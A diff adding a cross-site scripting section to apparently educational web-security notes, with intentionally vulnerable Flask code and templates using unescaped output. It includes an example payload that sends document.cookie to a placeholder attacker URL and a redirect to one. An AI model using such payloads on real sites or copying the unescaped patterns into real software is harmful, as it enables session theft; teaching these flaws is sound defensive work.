@@ -132,3 +132,73 @@ API keys allow for **route authentication**, or verifying that a user has permis
 - Make sure only right users can access your API. If you want to restrict certain users make sure to provide and ask for API keys.
 - Make sure the user has access to certain routes
 - Make sure to rate limit users to prevent spam requests
+
+## JavaScript
+While HTML and CSS can be abused, they only affect how the browser renders a web page. With JavaScript arises the possibility for malicious code to be run inside the browser.
+
+### Cross-Site Scripting
+Similar to how SQL injections abused the possibilities for users to modify the code being run on a database, cross-site scripting consists of running some arbitrary JavaScript code inside a browser. Here’s is an example of a Flask application that is vulnerable to such an attack:
+
+```py
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    return "Hello, world!"
+
+@app.errorhandler(404)
+def page_not_found(e)
+    return "Not Found: " + request.path
+```
+
+`page_not_found` will be run whenever the server returns a `404 Not Found` response code, thanks to Flask’s built in error handler.
+
+`request.path` is the URL which the user tried to access, but was not found by the server.
+
+If, instead an incorrect path, the user entered some JavaScript code in the URL (for example, `/<script>alert('hi')</script>`), then that code will be rendered in the HTML and run.
+
+Lots of modern browsers such as Chrome have *cross-site scripting auditors* built-in that will detect relatively simple cases, such as the previous example, and will not render the page. Nonetheless, there are cases which will get past such auditors, and not all browsers will have such features.
+
+More dangerous instancs of cross-site scripting can compromise passwords, credit card information, etc. Take the following script, for example:
+
+```js
+/<script>document.write('<img src="hacker_url?cookie="+document.cookie+">")</script>
+```
+
+`document.write` adds new content to the HTML source.
+
+The added content is an image, with a URL to some unknown site, but it is also being passed as a cookie `document.cookie`, which represents the cookie for the current page. If a hacker is monitoring the traffic to web server, then this request, which contains the cookie being used for the current site, is compromised. The hacker can then use that cookie to log in as that user on the current site. These are the sorts of vulnerabilites that cross-site scripting auditors try to protect against.
+
+One defense against cross-site scripting, like SQL injection is to ensure that any potentially dangerous characters are escaped. Frameworks like Flask and Django can often be configured to do this automatically.
+
+Cross-site scripting does not require JavaScript to passed through the URL. Here’s an example that abuses a database:
+
+```py
+@app.route("/", methods=["GET", "POST"])
+def index():
+    if request.method == "POST":
+        contents = request.form.get("contents")
+        db.execute("INSERT INTO messages (contents) VALUES (:contents)", {"contents": contents})
+    messages = db.execute("SELECT * FROM messages").fetchall()
+    return render_template("index.html", messages=messages)
+```
+
+This is a simple notes/message board app in which users can type in messages to be stored in a databse. Anytime the page is refreshed, all old messages are loaded.
+
+Now, insteading of tricking the user to make a request with malicious JavaScript in the URL, all that needs to be done is to enter that code as a message. The first time the message is submitted, it is being sent through to the server, which means that it is likely that a cross-site scripting auditor will catch it. After that, however, there is nothing suspicious about the URL. The code is being loaded server-side from the database, which means an auditor won’t be able to detect it, making this vulnerability arguably more severe.
+
+Other examples of malicious uses for cross-site scripting include rendering a completely different page with `document.body.innerHTML = "insert contents here"`, redirecting to different site with `window.location = "hacker_URL"`, etc.
+
+Note that for the previous example, the HTML had to purposefully written in order to get around Flask’s built-in character escaping behavior:
+
+```html
+<ul>
+    {% for message in messages %}
+        <li>{{ message.contents | safe }}</li>
+    {% endfor %}
+</ul>
+```
+
+`message.contents | safe` indicates that nothing should be escaped. Note that whenever template contents are generated manually, such as via string concatentation in the first example, that these sorts of automatic defenses are bypassed as well.
